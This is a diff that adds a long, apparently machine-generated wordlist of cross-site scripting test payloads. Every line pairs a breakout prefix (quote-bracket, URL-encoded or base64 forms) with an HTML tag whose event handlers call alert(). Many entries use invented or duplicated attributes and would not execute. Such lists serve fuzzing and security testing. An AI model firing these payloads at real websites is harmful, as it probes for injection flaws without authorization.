@@ -1,0 +1,1000 @@
+./>%20<./<img Autoplay='javascript:alert(3)' Onchange='alert(3)' Src='alert(1)' Data-info='test'/>
+Pjw=<img On='javascript:alert(3)' Onkeyup='alert(3)' Onerror='alert(1)' Data-test='test'/>
+.\>"</.<img Autofocus='javascript:alert(3)' Onclick='alert(3)' Alt='alert(1)' Data-custom='test'/>
+>"<<video Popover Onkeydown='alert(2)' Onplay='alert(1)' Data-test='test'></video>
+\"><input Autofocus='javascript:alert(3)' Onchange='alert(3)' Value='alert(1)' Data-xss='test'/>
+\"><audio Autoplay Onpaste='alert(2)' Autoplay='alert(1)' Data-info='test'></audio>
+./>%20<./<img Autoplay='javascript:alert(3)' Onchange='alert(3)' Onerror='alert(1)' Data-test='test'/>
+><<form Autoplay='javascript:alert(3)' Onchange='alert(3)' Onsubmit='alert(1)' Data-xss='test'/>
+%20">%20<<input Autoplay='javascript:alert(3)' Onkeydown='alert(3)' Onfocus='alert(1)' Data-test='test'/>
+Pjw=<iframe Onerror='alert(1)' Onload='alert(1)' Autoplay>alert(1)</iframe>
+>"<<img Only='javascript:alert(3)' Onblur='alert(3)' Onerror='alert(1)' Data-test='test'/>
+>"<<svg Ontoggle='alert(1)' Onmouseover='alert(1)' Autoplay>alert(1)</svg>
+./>%20<./<script Onerror='alert(1)' Src='alert(1)' On>alert(1)</script>
+%20">%20<<body On='javascript:alert(3)' Onselect='alert(3)' Onload='alert(1)' Data-xss='test'/>
+><<input Popover='javascript:alert(3)' Ontoggle='alert(3)' Value='alert(1)' Data-test='test'/>
+%3e%3c<script Onmouseover='alert(1)' Src='alert(1)' Autoplay>alert(1)</script>
+./>%20<./<form Popover='javascript:alert(3)' Onerror='alert(3)' Action='alert(1)' Data-info='test'/>
+./>%20<./<script Onmouseover='alert(1)' Type='alert(1)' Autoplay>alert(1)</script>
+.\>"</.<audio Only Onselect='alert(2)' Onplay='alert(1)' Data-xss='test'></audio>
+.\>"</.<body On='javascript:alert(3)' Oninput='alert(3)' Onerror='alert(1)' Data-info='test'/>
+./>%20<./<iframe Onerror='alert(1)' Onload='alert(1)' Only>alert(1)</iframe>
+"><iframe Onchange='alert(1)' Src='alert(1)' Autofocus>alert(1)</iframe>
+><<input Popover='javascript:alert(3)' Ontoggle='alert(3)' Onchange='alert(1)' Data-test='test'/>
+/>%20<<form On='javascript:alert(3)' Ontoggle='alert(3)' Action='alert(1)' Data-custom='test'/>
+\"><input Only='javascript:alert(3)' Onblur='alert(3)' Onfocus='alert(1)' Data-info='test'/>
+\"><video Only Onsubmit='alert(2)' Onplay='alert(1)' Data-xss='test'></video>
+><<form Only='javascript:alert(3)' Oninput='alert(3)' Onsubmit='alert(1)' Data-info='test'/>
+.\>"</.<svg Onclick='alert(1)' Style='alert(1)' Autofocus>alert(1)</svg>
+\"><form Autofocus='javascript:alert(3)' Onpaste='alert(3)' Onsubmit='alert(1)' Data-xss='test'/>
+/>%20<<body Popover='javascript:alert(3)' Onpaste='alert(3)' Onload='alert(1)' Data-test='test'/>
+"><video Autofocus Onsubmit='alert(2)' Autoplay='alert(1)' Data-test='test'></video>
+\"><form Only='javascript:alert(3)' Onblur='alert(3)' Onsubmit='alert(1)' Data-info='test'/>
+%20/%20><body On='javascript:alert(3)' Onmouseover='alert(3)' Onerror='alert(1)' Data-custom='test'/>
+./>%20<./<script Onmouseover='alert(1)' Type='alert(1)' On>alert(1)</script>
+/>%20<<img Only='javascript:alert(3)' Onload='alert(3)' Onerror='alert(1)' Data-info='test'/>
+.\>"</.<audio Autofocus Onload='alert(2)' Onplay='alert(1)' Data-test='test'></audio>
+.\>"</.<audio Autoplay Onmouseover='alert(2)' Onplay='alert(1)' Data-custom='test'></audio>
+\"><audio Autoplay Onfocus='alert(2)' Autoplay='alert(1)' Data-info='test'></audio>
+><<svg Onerror='alert(1)' Onmouseover='alert(1)' On>alert(1)</svg>
+%3e%3c<audio Popover Onerror='alert(2)' Src='alert(1)' Data-info='test'></audio>
+Pjw=<script Onsubmit='alert(1)' Type='alert(1)' Autoplay>alert(1)</script>
+<"<img Popover='javascript:alert(3)' Onfocus='alert(3)' Alt='alert(1)' Data-info='test'/>
+%3e%3c<form Autofocus='javascript:alert(3)' Oninput='alert(3)' Onsubmit='alert(1)' Data-info='test'/>
+./>%20<./<script Onsubmit='alert(1)' Src='alert(1)' Href>alert(1)</script>
+%3e%3c<svg Onblur='alert(1)' Style='alert(1)' Autoplay>alert(1)</svg>
+%20">%20<<audio Only Oninput='alert(2)' Autoplay='alert(1)' Data-custom='test'></audio>
+.\>"</.<input Autofocus='javascript:alert(3)' Onfocus='alert(3)' Value='alert(1)' Data-xss='test'/>
+'>\"<video Href Onchange='alert(2)' Onplay='alert(1)' Data-custom='test'></video>
+><<audio Autoplay Onload='alert(2)' Src='alert(1)' Data-xss='test'></audio>
+./>%20<./<img Href='javascript:alert(3)' Onblur='alert(3)' Onerror='alert(1)' Data-custom='test'/>
+<"<svg Onerror='alert(1)' Style='alert(1)' On>alert(1)</svg>
+.\>"</.<audio Href Onblur='alert(2)' Autoplay='alert(1)' Data-test='test'></audio>
+/>%20<<script Onsubmit='alert(1)' Type='alert(1)' Popover>alert(1)</script>
+%20/%20><iframe Onsubmit='alert(1)' Src='alert(1)' Autofocus>alert(1)</iframe>
+.\>"</.<iframe Oninput='alert(1)' Onload='alert(1)' On>alert(1)</iframe>
+Pjw=<script Onselect='alert(1)' Src='alert(1)' Autoplay>alert(1)</script>
+/>%20<<audio Only Onpaste='alert(2)' Onplay='alert(1)' Data-xss='test'></audio>
+Pjw=<script Onkeyup='alert(1)' Src='alert(1)' Autoplay>alert(1)</script>
+'>\"<input Autofocus='javascript:alert(3)' Onerror='alert(3)' Value='alert(1)' Data-xss='test'/>
+'>\"<body Only='javascript:alert(3)' Onclick='alert(3)' Onerror='alert(1)' Data-test='test'/>
+>"<<iframe Onfocus='alert(1)' Onload='alert(1)' On>alert(1)</iframe>
+\"><input Only='javascript:alert(3)' Onclick='alert(3)' Onfocus='alert(1)' Data-info='test'/>
+/>%20<<script Onsubmit='alert(1)' Src='alert(1)' Only>alert(1)</script>
+%3e%3c<script Onsubmit='alert(1)' Type='alert(1)' Autofocus>alert(1)</script>
+\"><video On Onerror='alert(2)' Onplay='alert(1)' Data-test='test'></video>
+/>%20<<svg Onsubmit='alert(1)' Onmouseover='alert(1)' Autoplay>alert(1)</svg>
+>"<<svg Onselect='alert(1)' Onmouseover='alert(1)' On>alert(1)</svg>
+%20">%20<<video Popover Oninput='alert(2)' Onplay='alert(1)' Data-xss='test'></video>
+.\>"</.<img Popover='javascript:alert(3)' Onkeydown='alert(3)' Alt='alert(1)' Data-xss='test'/>
+Pjw=<audio Only Onblur='alert(2)' Autoplay='alert(1)' Data-test='test'></audio>
+%20">%20<<video Autofocus Onfocus='alert(2)' Src='alert(1)' Data-xss='test'></video>
+\"><audio Href Onsubmit='alert(2)' Autoplay='alert(1)' Data-info='test'></audio>
+Pjw=<audio Href Oninput='alert(2)' Onplay='alert(1)' Data-info='test'></audio>
+><<img Autoplay='javascript:alert(3)' Onclick='alert(3)' Alt='alert(1)' Data-custom='test'/>
+%3e%3c<video Popover Onblur='alert(2)' Onplay='alert(1)' Data-custom='test'></video>
+<"<img Href='javascript:alert(3)' Onselect='alert(3)' Src='alert(1)' Data-info='test'/>
+\"><svg Onkeyup='alert(1)' Onmouseover='alert(1)' Autofocus>alert(1)</svg>
+%20">%20<<form Only='javascript:alert(3)' Oninput='alert(3)' Action='alert(1)' Data-xss='test'/>
+%20/%20><audio Popover Onpaste='alert(2)' Onplay='alert(1)' Data-custom='test'></audio>
+%20">%20<<svg Onselect='alert(1)' Onmouseover='alert(1)' Autofocus>alert(1)</svg>
+%20/%20><svg Onerror='alert(1)' Onmouseover='alert(1)' Popover>alert(1)</svg>
+Pjw=<body Only='javascript:alert(3)' Onselect='alert(3)' Onerror='alert(1)' Data-custom='test'/>
+.\>"</.<video Popover Onclick='alert(2)' Onplay='alert(1)' Data-info='test'></video>
+'>\"<iframe Onpaste='alert(1)' Onload='alert(1)' Href>alert(1)</iframe>
+'>\"<input On='javascript:alert(3)' Onsubmit='alert(3)' Value='alert(1)' Data-info='test'/>
+%20">%20<<audio Autoplay Onselect='alert(2)' Autoplay='alert(1)' Data-custom='test'></audio>
+<"<body Autofocus='javascript:alert(3)' Onpaste='alert(3)' Onerror='alert(1)' Data-info='test'/>
+./>%20<./<video Only Onclick='alert(2)' Autoplay='alert(1)' Data-xss='test'></video>
+%3e%3c<iframe Onpaste='alert(1)' Src='alert(1)' Only>alert(1)</iframe>
+.\>"</.<body Href='javascript:alert(3)' Onerror='alert(3)' Onerror='alert(1)' Data-info='test'/>
+%20">%20<<input Href='javascript:alert(3)' Ontoggle='alert(3)' Onchange='alert(1)' Data-info='test'/>
+%20/%20><video Href Onfocus='alert(2)' Onplay='alert(1)' Data-xss='test'></video>
+><<input On='javascript:alert(3)' Oninput='alert(3)' Value='alert(1)' Data-test='test'/>
+"><svg Onmouseover='alert(1)' Style='alert(1)' Popover>alert(1)</svg>
+Pjw=<video On Onclick='alert(2)' Src='alert(1)' Data-xss='test'></video>
+>"<<input Href='javascript:alert(3)' Onmouseover='alert(3)' Value='alert(1)' Data-test='test'/>
+"><img Href='javascript:alert(3)' Onclick='alert(3)' Onerror='alert(1)' Data-info='test'/>
+><<svg Onmouseover='alert(1)' Onload='alert(1)' Autofocus>alert(1)</svg>
+\"><script Onselect='alert(1)' Src='alert(1)' On>alert(1)</script>
+%20">%20<<audio Popover Onsubmit='alert(2)' Src='alert(1)' Data-custom='test'></audio>
+%3e%3c<video On Onchange='alert(2)' Autoplay='alert(1)' Data-xss='test'></video>
+Pjw=<script Onpaste='alert(1)' Type='alert(1)' On>alert(1)</script>
+'>\"<svg Onchange='alert(1)' Onmouseover='alert(1)' Autofocus>alert(1)</svg>
+'>\"<svg Onchange='alert(1)' Style='alert(1)' Only>alert(1)</svg>
+'>\"<iframe Oninput='alert(1)' Src='alert(1)' Autofocus>alert(1)</iframe>
+>"<<iframe Onerror='alert(1)' Onload='alert(1)' Popover>alert(1)</iframe>
+/>%20<<video Only Onkeyup='alert(2)' Src='alert(1)' Data-test='test'></video>
+"><svg Onblur='alert(1)' Onmouseover='alert(1)' Popover>alert(1)</svg>
+.\>"</.<script Onload='alert(1)' Src='alert(1)' Popover>alert(1)</script>
+"><body Only='javascript:alert(3)' Onfocus='alert(3)' Onerror='alert(1)' Data-xss='test'/>
+><<iframe Onclick='alert(1)' Src='alert(1)' Only>alert(1)</iframe>
+\"><input On='javascript:alert(3)' Onchange='alert(3)' Value='alert(1)' Data-test='test'/>
+%20">%20<<script Onselect='alert(1)' Type='alert(1)' Popover>alert(1)</script>
+>"<<body On='javascript:alert(3)' Onchange='alert(3)' Onload='alert(1)' Data-test='test'/>
+%20">%20<<input Autofocus='javascript:alert(3)' Onkeydown='alert(3)' Onfocus='alert(1)' Data-info='test'/>
+'>\"<svg Onmouseover='alert(1)' Onmouseover='alert(1)' Autofocus>alert(1)</svg>
+.\>"</.<script Onerror='alert(1)' Type='alert(1)' Autofocus>alert(1)</script>
+%20/%20><body Popover='javascript:alert(3)' Onerror='alert(3)' Onerror='alert(1)' Data-custom='test'/>
+'>\"<audio Popover Onchange='alert(2)' Autoplay='alert(1)' Data-custom='test'></audio>
+>"<<form Autoplay='javascript:alert(3)' Onload='alert(3)' Onsubmit='alert(1)' Data-xss='test'/>
+./>%20<./<body Autoplay='javascript:alert(3)' Onerror='alert(3)' Onerror='alert(1)' Data-custom='test'/>
+><<body Popover='javascript:alert(3)' Onkeyup='alert(3)' Onerror='alert(1)' Data-custom='test'/>
+>"<<input Autofocus='javascript:alert(3)' Oninput='alert(3)' Onfocus='alert(1)' Data-xss='test'/>
+%3e%3c<body Popover='javascript:alert(3)' Oninput='alert(3)' Onload='alert(1)' Data-info='test'/>
+'>\"<iframe Oninput='alert(1)' Onload='alert(1)' Popover>alert(1)</iframe>
+><<iframe Onmouseover='alert(1)' Src='alert(1)' Autoplay>alert(1)</iframe>
+%3e%3c<form Only='javascript:alert(3)' Onselect='alert(3)' Onsubmit='alert(1)' Data-info='test'/>
+>"<<audio On Onkeydown='alert(2)' Src='alert(1)' Data-custom='test'></audio>
+'>\"<script Ontoggle='alert(1)' Src='alert(1)' Autofocus>alert(1)</script>
+%20">%20<<audio Href Onmouseover='alert(2)' Autoplay='alert(1)' Data-xss='test'></audio>
+<"<audio Autofocus Onkeyup='alert(2)' Onplay='alert(1)' Data-xss='test'></audio>
+"><audio Only Onsubmit='alert(2)' Src='alert(1)' Data-test='test'></audio>
+/>%20<<audio Autoplay Oninput='alert(2)' Src='alert(1)' Data-xss='test'></audio>
+%20/%20><svg Oninput='alert(1)' Style='alert(1)' Autoplay>alert(1)</svg>
+<"<input Popover='javascript:alert(3)' Onload='alert(3)' Onfocus='alert(1)' Data-custom='test'/>
+/>%20<<iframe Onfocus='alert(1)' Onload='alert(1)' Href>alert(1)</iframe>
+'>\"<svg Onmouseover='alert(1)' Onload='alert(1)' Popover>alert(1)</svg>
+<"<form Autoplay='javascript:alert(3)' Onerror='alert(3)' Action='alert(1)' Data-info='test'/>
+.\>"</.<img Autoplay='javascript:alert(3)' Onsubmit='alert(3)' Src='alert(1)' Data-test='test'/>
+"><audio Autoplay Onkeydown='alert(2)' Src='alert(1)' Data-info='test'></audio>
+<"<audio Href Onkeydown='alert(2)' Autoplay='alert(1)' Data-custom='test'></audio>
+<"<iframe Onchange='alert(1)' Src='alert(1)' Href>alert(1)</iframe>
+%20">%20<<video Autoplay Onclick='alert(2)' Src='alert(1)' Data-custom='test'></video>
+"><script Onfocus='alert(1)' Src='alert(1)' Href>alert(1)</script>
+Pjw=<svg Onerror='alert(1)' Onmouseover='alert(1)' Autoplay>alert(1)</svg>
+./>%20<./<iframe Onchange='alert(1)' Src='alert(1)' Only>alert(1)</iframe>
+./>%20<./<svg Onchange='alert(1)' Style='alert(1)' Autoplay>alert(1)</svg>
+%20/%20><script Onchange='alert(1)' Src='alert(1)' Href>alert(1)</script>
+%20/%20><svg Onblur='alert(1)' Style='alert(1)' Autofocus>alert(1)</svg>
+Pjw=<input Autofocus='javascript:alert(3)' Ontoggle='alert(3)' Value='alert(1)' Data-test='test'/>
+%20/%20><img Autofocus='javascript:alert(3)' Onselect='alert(3)' Alt='alert(1)' Data-info='test'/>
+>"<<svg Onload='alert(1)' Onmouseover='alert(1)' Href>alert(1)</svg>
+./>%20<./<body Href='javascript:alert(3)' Oninput='alert(3)' Onerror='alert(1)' Data-xss='test'/>
+<"<iframe Onchange='alert(1)' Src='alert(1)' Autoplay>alert(1)</iframe>
+/>%20<<audio Only Onselect='alert(2)' Autoplay='alert(1)' Data-xss='test'></audio>
+/>%20<<body On='javascript:alert(3)' Onfocus='alert(3)' Onerror='alert(1)' Data-info='test'/>
+./>%20<./<form Popover='javascript:alert(3)' Onmouseover='alert(3)' Action='alert(1)' Data-custom='test'/>
+<"<form Only='javascript:alert(3)' Onload='alert(3)' Onsubmit='alert(1)' Data-info='test'/>
+><<video Only Onfocus='alert(2)' Src='alert(1)' Data-custom='test'></video>
+\"><input Href='javascript:alert(3)' Onchange='alert(3)' Onfocus='alert(1)' Data-test='test'/>
+/>%20<<input Only='javascript:alert(3)' Onmouseover='alert(3)' Onchange='alert(1)' Data-test='test'/>
+Pjw=<iframe Onblur='alert(1)' Onload='alert(1)' Autoplay>alert(1)</iframe>
+.\>"</.<video Href Onclick='alert(2)' Onplay='alert(1)' Data-info='test'></video>
+"><body On='javascript:alert(3)' Onerror='alert(3)' Onerror='alert(1)' Data-info='test'/>
+%3e%3c<svg Onsubmit='alert(1)' Onmouseover='alert(1)' Href>alert(1)</svg>
+./>%20<./<img On='javascript:alert(3)' Oninput='alert(3)' Alt='alert(1)' Data-test='test'/>
+Pjw=<video Autofocus Onblur='alert(2)' Autoplay='alert(1)' Data-test='test'></video>
+./>%20<./<video Autofocus Onmouseover='alert(2)' Autoplay='alert(1)' Data-custom='test'></video>
+><<form Href='javascript:alert(3)' Onerror='alert(3)' Action='alert(1)' Data-test='test'/>
+<"<video Only Onmouseover='alert(2)' Onplay='alert(1)' Data-test='test'></video>
+/>%20<<input On='javascript:alert(3)' Onerror='alert(3)' Value='alert(1)' Data-info='test'/>
+>"<<input On='javascript:alert(3)' Onclick='alert(3)' Value='alert(1)' Data-custom='test'/>
+/>%20<<form Autofocus='javascript:alert(3)' Ontoggle='alert(3)' Action='alert(1)' Data-custom='test'/>
+"><form Only='javascript:alert(3)' Onclick='alert(3)' Action='alert(1)' Data-custom='test'/>
+'>\"<audio Only Onpaste='alert(2)' Src='alert(1)' Data-test='test'></audio>
+%20/%20><input Popover='javascript:alert(3)' Onclick='alert(3)' Value='alert(1)' Data-xss='test'/>
+<"<iframe Onsubmit='alert(1)' Onload='alert(1)' Only>alert(1)</iframe>
+.\>"</.<audio Popover Onerror='alert(2)' Src='alert(1)' Data-xss='test'></audio>
+.\>"</.<form Autoplay='javascript:alert(3)' Onerror='alert(3)' Action='alert(1)' Data-xss='test'/>
+.\>"</.<input Only='javascript:alert(3)' Onpaste='alert(3)' Onfocus='alert(1)' Data-info='test'/>
+\"><svg Onerror='alert(1)' Style='alert(1)' Popover>alert(1)</svg>
+%20">%20<<form Autoplay='javascript:alert(3)' Onclick='alert(3)' Onsubmit='alert(1)' Data-test='test'/>
+<"<audio On Onpaste='alert(2)' Autoplay='alert(1)' Data-xss='test'></audio>
+.\>"</.<input Only='javascript:alert(3)' Onerror='alert(3)' Onchange='alert(1)' Data-info='test'/>
+<"<audio Autofocus Onclick='alert(2)' Onplay='alert(1)' Data-xss='test'></audio>
+.\>"</.<input Only='javascript:alert(3)' Oninput='alert(3)' Onchange='alert(1)' Data-custom='test'/>
+'>\"<input Autofocus='javascript:alert(3)' Onmouseover='alert(3)' Value='alert(1)' Data-xss='test'/>
+/>%20<<svg Oninput='alert(1)' Onmouseover='alert(1)' Autoplay>alert(1)</svg>
+>"<<iframe Onclick='alert(1)' Src='alert(1)' Href>alert(1)</iframe>
+%3e%3c<img Autofocus='javascript:alert(3)' Oninput='alert(3)' Onerror='alert(1)' Data-xss='test'/>
+.\>"</.<svg Onchange='alert(1)' Style='alert(1)' Only>alert(1)</svg>
+./>%20<./<audio Autofocus Onclick='alert(2)' Autoplay='alert(1)' Data-xss='test'></audio>
+.\>"</.<form Autoplay='javascript:alert(3)' Onselect='alert(3)' Onsubmit='alert(1)' Data-custom='test'/>
+>"<<video On Onload='alert(2)' Autoplay='alert(1)' Data-test='test'></video>
+"><svg Onerror='alert(1)' Onload='alert(1)' Popover>alert(1)</svg>
+\"><svg Onkeydown='alert(1)' Onmouseover='alert(1)' Href>alert(1)</svg>
+>"<<form Href='javascript:alert(3)' Onpaste='alert(3)' Onsubmit='alert(1)' Data-test='test'/>
+'>\"<script Onclick='alert(1)' Src='alert(1)' Href>alert(1)</script>
+"><audio On Onfocus='alert(2)' Src='alert(1)' Data-xss='test'></audio>
+Pjw=<video Only Onkeydown='alert(2)' Autoplay='alert(1)' Data-test='test'></video>
+\"><iframe Onclick='alert(1)' Src='alert(1)' Only>alert(1)</iframe>
+%20/%20><body Popover='javascript:alert(3)' Onclick='alert(3)' Onload='alert(1)' Data-custom='test'/>
+%20/%20><audio Only Onfocus='alert(2)' Autoplay='alert(1)' Data-custom='test'></audio>
+.\>"</.<input Autoplay='javascript:alert(3)' Onpaste='alert(3)' Value='alert(1)' Data-custom='test'/>
+Pjw=<input Popover='javascript:alert(3)' Onfocus='alert(3)' Value='alert(1)' Data-xss='test'/>
+\"><iframe Oninput='alert(1)' Src='alert(1)' On>alert(1)</iframe>
+./>%20<./<iframe Onkeyup='alert(1)' Src='alert(1)' Href>alert(1)</iframe>
+Pjw=<video Popover Onclick='alert(2)' Onplay='alert(1)' Data-test='test'></video>
+Pjw=<iframe Onblur='alert(1)' Src='alert(1)' Autofocus>alert(1)</iframe>
+"><form Popover='javascript:alert(3)' Onmouseover='alert(3)' Onsubmit='alert(1)' Data-test='test'/>
+/>%20<<img Href='javascript:alert(3)' Onchange='alert(3)' Onerror='alert(1)' Data-test='test'/>
+%20/%20><iframe Onerror='alert(1)' Src='alert(1)' Autofocus>alert(1)</iframe>
+.\>"</.<img Only='javascript:alert(3)' Onkeyup='alert(3)' Src='alert(1)' Data-test='test'/>
+\"><audio Autofocus Onerror='alert(2)' Autoplay='alert(1)' Data-info='test'></audio>
+>"<<audio Href Onkeydown='alert(2)' Autoplay='alert(1)' Data-custom='test'></audio>
+%20/%20><body Only='javascript:alert(3)' Onload='alert(3)' Onload='alert(1)' Data-custom='test'/>
+/>%20<<video Popover Onclick='alert(2)' Onplay='alert(1)' Data-custom='test'></video>
+%3e%3c<video Only Onchange='alert(2)' Autoplay='alert(1)' Data-xss='test'></video>
+\"><audio Popover Onkeyup='alert(2)' Src='alert(1)' Data-test='test'></audio>
+%20/%20><svg Onload='alert(1)' Onmouseover='alert(1)' Href>alert(1)</svg>
+\"><iframe Onclick='alert(1)' Src='alert(1)' Autoplay>alert(1)</iframe>
+%3e%3c<video Autoplay Onsubmit='alert(2)' Onplay='alert(1)' Data-test='test'></video>
+./>%20<./<input Href='javascript:alert(3)' Ontoggle='alert(3)' Onfocus='alert(1)' Data-custom='test'/>
+Pjw=<body Popover='javascript:alert(3)' Onblur='alert(3)' Onload='alert(1)' Data-xss='test'/>
+<"<script Onkeyup='alert(1)' Src='alert(1)' Only>alert(1)</script>
+%20">%20<<form On='javascript:alert(3)' Onpaste='alert(3)' Action='alert(1)' Data-info='test'/>
+/>%20<<video Only Onsubmit='alert(2)' Onplay='alert(1)' Data-custom='test'></video>
+>"<<input Only='javascript:alert(3)' Ontoggle='alert(3)' Onchange='alert(1)' Data-info='test'/>
+./>%20<./<svg Onchange='alert(1)' Onload='alert(1)' On>alert(1)</svg>
+>"<<svg Onclick='alert(1)' Onload='alert(1)' Only>alert(1)</svg>
+%20">%20<<img Only='javascript:alert(3)' Onload='alert(3)' Src='alert(1)' Data-info='test'/>
+'>\"<input Only='javascript:alert(3)' Onkeyup='alert(3)' Onchange='alert(1)' Data-xss='test'/>
+>"<<img Only='javascript:alert(3)' Onfocus='alert(3)' Alt='alert(1)' Data-xss='test'/>
+./>%20<./<svg Onpaste='alert(1)' Style='alert(1)' On>alert(1)</svg>
+%20">%20<<body Autofocus='javascript:alert(3)' Onselect='alert(3)' Onload='alert(1)' Data-xss='test'/>
+>"<<svg Onfocus='alert(1)' Style='alert(1)' Href>alert(1)</svg>
+.\>"</.<iframe Onkeyup='alert(1)' Src='alert(1)' Autofocus>alert(1)</iframe>
+'>\"<input Popover='javascript:alert(3)' Onselect='alert(3)' Onchange='alert(1)' Data-test='test'/>
+><<body On='javascript:alert(3)' Oninput='alert(3)' Onload='alert(1)' Data-xss='test'/>
+./>%20<./<iframe Onsubmit='alert(1)' Src='alert(1)' Only>alert(1)</iframe>
+/>%20<<body Only='javascript:alert(3)' Onkeydown='alert(3)' Onload='alert(1)' Data-custom='test'/>
+><<body Href='javascript:alert(3)' Oninput='alert(3)' Onload='alert(1)' Data-xss='test'/>
+<"<img Popover='javascript:alert(3)' Onpaste='alert(3)' Onerror='alert(1)' Data-test='test'/>
+./>%20<./<input Autofocus='javascript:alert(3)' Onmouseover='alert(3)' Onchange='alert(1)' Data-test='test'/>
+"><audio Popover Onmouseover='alert(2)' Onplay='alert(1)' Data-test='test'></audio>
+"><img Href='javascript:alert(3)' Onfocus='alert(3)' Src='alert(1)' Data-xss='test'/>
+%3e%3c<body Href='javascript:alert(3)' Onload='alert(3)' Onerror='alert(1)' Data-info='test'/>
+><<iframe Onblur='alert(1)' Onload='alert(1)' Autofocus>alert(1)</iframe>
+%20/%20><video Popover Onclick='alert(2)' Autoplay='alert(1)' Data-info='test'></video>
+Pjw=<iframe Onblur='alert(1)' Src='alert(1)' Only>alert(1)</iframe>
+%3e%3c<video Popover Onsubmit='alert(2)' Autoplay='alert(1)' Data-custom='test'></video>
+<"<audio Only Onkeydown='alert(2)' Src='alert(1)' Data-test='test'></audio>
+%3e%3c<svg Onchange='alert(1)' Style='alert(1)' Popover>alert(1)</svg>
+/>%20<<input Href='javascript:alert(3)' Onload='alert(3)' Onfocus='alert(1)' Data-info='test'/>
+%20">%20<<input Autofocus='javascript:alert(3)' Onload='alert(3)' Onchange='alert(1)' Data-test='test'/>
+%20/%20><video Popover Onerror='alert(2)' Autoplay='alert(1)' Data-custom='test'></video>
+><<audio Href Onfocus='alert(2)' Src='alert(1)' Data-info='test'></audio>
+Pjw=<body Href='javascript:alert(3)' Onload='alert(3)' Onerror='alert(1)' Data-custom='test'/>
+%20/%20><video Only Onkeyup='alert(2)' Autoplay='alert(1)' Data-custom='test'></video>
+<"<input Autofocus='javascript:alert(3)' Onselect='alert(3)' Onfocus='alert(1)' Data-custom='test'/>
+"><video Href Onkeyup='alert(2)' Src='alert(1)' Data-xss='test'></video>
+%20">%20<<script Ontoggle='alert(1)' Type='alert(1)' On>alert(1)</script>
+%3e%3c<img Autofocus='javascript:alert(3)' Onsubmit='alert(3)' Src='alert(1)' Data-custom='test'/>
+%20">%20<<form On='javascript:alert(3)' Onchange='alert(3)' Action='alert(1)' Data-custom='test'/>
+<"<script Onchange='alert(1)' Src='alert(1)' Href>alert(1)</script>
+><<iframe Onblur='alert(1)' Src='alert(1)' Href>alert(1)</iframe>
+><<form Autofocus='javascript:alert(3)' Onblur='alert(3)' Onsubmit='alert(1)' Data-test='test'/>
+%20/%20><iframe Onload='alert(1)' Onload='alert(1)' On>alert(1)</iframe>
+./>%20<./<img Only='javascript:alert(3)' Onkeyup='alert(3)' Src='alert(1)' Data-custom='test'/>
+><<input Href='javascript:alert(3)' Onmouseover='alert(3)' Onchange='alert(1)' Data-test='test'/>
+%20">%20<<form Href='javascript:alert(3)' Onchange='alert(3)' Action='alert(1)' Data-custom='test'/>
+'>\"<form Only='javascript:alert(3)' Oninput='alert(3)' Onsubmit='alert(1)' Data-test='test'/>
+.\>"</.<script Ontoggle='alert(1)' Type='alert(1)' On>alert(1)</script>
+Pjw=<img Autofocus='javascript:alert(3)' Onchange='alert(3)' Alt='alert(1)' Data-xss='test'/>
+><<img On='javascript:alert(3)' Onerror='alert(3)' Onerror='alert(1)' Data-custom='test'/>
+>"<<audio On Onpaste='alert(2)' Autoplay='alert(1)' Data-info='test'></audio>
+%20">%20<<script Onblur='alert(1)' Src='alert(1)' Autoplay>alert(1)</script>
+.\>"</.<form Popover='javascript:alert(3)' Onerror='alert(3)' Onsubmit='alert(1)' Data-test='test'/>
+>"<<iframe Onselect='alert(1)' Onload='alert(1)' Autofocus>alert(1)</iframe>
+>"<<img Autofocus='javascript:alert(3)' Onkeyup='alert(3)' Src='alert(1)' Data-custom='test'/>
+'>\"<iframe Onmouseover='alert(1)' Onload='alert(1)' Popover>alert(1)</iframe>
+><<input Autofocus='javascript:alert(3)' Onclick='alert(3)' Onchange='alert(1)' Data-xss='test'/>
+\"><input Href='javascript:alert(3)' Onfocus='alert(3)' Onfocus='alert(1)' Data-xss='test'/>
+/>%20<<form On='javascript:alert(3)' Onsubmit='alert(3)' Action='alert(1)' Data-custom='test'/>
+\"><audio Autoplay Onchange='alert(2)' Src='alert(1)' Data-custom='test'></audio>
+%20">%20<<script Ontoggle='alert(1)' Type='alert(1)' Popover>alert(1)</script>
+%3e%3c<script Onselect='alert(1)' Type='alert(1)' Href>alert(1)</script>
+.\>"</.<img Autofocus='javascript:alert(3)' Onclick='alert(3)' Onerror='alert(1)' Data-test='test'/>
+.\>"</.<img Autoplay='javascript:alert(3)' Onload='alert(3)' Src='alert(1)' Data-custom='test'/>
+>"<<form Href='javascript:alert(3)' Onfocus='alert(3)' Onsubmit='alert(1)' Data-info='test'/>
+><<svg Onerror='alert(1)' Onload='alert(1)' Popover>alert(1)</svg>
+><<form On='javascript:alert(3)' Onblur='alert(3)' Onsubmit='alert(1)' Data-custom='test'/>
+><<video Href Onpaste='alert(2)' Autoplay='alert(1)' Data-custom='test'></video>
+%20/%20><video Href Onchange='alert(2)' Src='alert(1)' Data-custom='test'></video>
+%20/%20><input Autofocus='javascript:alert(3)' Ontoggle='alert(3)' Value='alert(1)' Data-xss='test'/>
+/>%20<<audio Popover Onclick='alert(2)' Onplay='alert(1)' Data-xss='test'></audio>
+><<form On='javascript:alert(3)' Onclick='alert(3)' Onsubmit='alert(1)' Data-test='test'/>
+.\>"</.<input Href='javascript:alert(3)' Onload='alert(3)' Onfocus='alert(1)' Data-xss='test'/>
+/>%20<<video Autoplay Onpaste='alert(2)' Onplay='alert(1)' Data-xss='test'></video>
+Pjw=<body Popover='javascript:alert(3)' Oninput='alert(3)' Onload='alert(1)' Data-test='test'/>
+<"<img On='javascript:alert(3)' Onkeydown='alert(3)' Alt='alert(1)' Data-info='test'/>
+"><audio Autoplay Onmouseover='alert(2)' Onplay='alert(1)' Data-info='test'></audio>
+%20">%20<<audio Popover Onerror='alert(2)' Onplay='alert(1)' Data-custom='test'></audio>
+/>%20<<audio Popover Ontoggle='alert(2)' Src='alert(1)' Data-info='test'></audio>
+Pjw=<audio On Onload='alert(2)' Autoplay='alert(1)' Data-info='test'></audio>
+'>\"<body Autofocus='javascript:alert(3)' Onclick='alert(3)' Onerror='alert(1)' Data-xss='test'/>
+"><input Autoplay='javascript:alert(3)' Onerror='alert(3)' Onchange='alert(1)' Data-custom='test'/>
+><<script Ontoggle='alert(1)' Type='alert(1)' Popover>alert(1)</script>
+/>%20<<form Only='javascript:alert(3)' Onblur='alert(3)' Onsubmit='alert(1)' Data-custom='test'/>
